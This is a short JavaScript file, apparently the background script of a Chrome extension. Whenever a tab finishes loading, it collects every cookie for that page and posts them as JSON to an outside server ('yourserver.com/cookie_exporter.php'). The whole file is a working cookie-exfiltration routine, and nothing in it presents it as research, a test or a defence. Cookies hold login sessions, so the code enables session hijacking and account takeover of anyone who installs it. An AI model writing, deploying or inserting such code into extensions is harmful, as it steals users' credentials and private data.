chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete') {
      chrome.cookies.getAll({ url: tab.url }, (cookies) => {
        exportCookies(cookies);
      });
    }
  });
  
  function exportCookies(cookies) {
    const data = { cookies: cookies };
    const url = 'https://yourserver.com/cookie_exporter.php';
  
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
      .then((response) => response.json())
      .then((data) => {
        console.log(data.message);
      })
      .catch((error) => {
        console.error('Error exporting cookies:', error);
      });
  }
  